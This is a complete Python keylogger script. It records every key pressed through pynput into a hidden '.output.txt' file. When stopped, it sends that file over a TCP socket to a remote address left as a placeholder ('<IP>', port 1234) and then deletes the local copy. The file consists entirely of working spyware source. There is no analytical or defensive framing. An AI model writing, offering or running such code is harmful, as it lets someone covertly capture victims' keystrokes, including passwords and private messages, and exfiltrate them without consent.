import os, socket
from pynput import keyboard

class KeyLogger:

    def __init__(self) -> None:
        self.ip = "<IP>"
        self.port = 1234
        self.output = os.path.join(os.getcwd(),".output.txt")

    def log(self, data: str) -> None:
        with open(self.output, 'a') as file_to_log:
            file_to_log.write(data)

    def on_press(self, key) -> None:
        result = ""
        try:
            self.log(key.char)
        except AttributeError:
            if key == key.space: result = " "
            elif key == key.enter: result = "\n"
            else: result = "?"
            self.log(result)

    def send(self) -> None:
        try:
            with open(self.output, 'rb') as file:
                content = file.read()

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as connection:
                connection.connect((self.ip, self.port))
                connection.sendall(content)
            os.remove(self.output)

        except Exception as e:
            self.log(f"Error ocurred: {e}")

    def main(self) -> None:
        try:
            self.log("--------- INIT KEY LOGGER ---------\n")
            with keyboard.Listener(on_press=self.on_press) as listener:
                listener.join()
        except KeyboardInterrupt as e:
            self.log("\n--------- FIN KEY LOGGER ---------")
            self.send()
            exit(0)

if __name__ == "__main__":
    key_logger = KeyLogger()
    key_logger.main()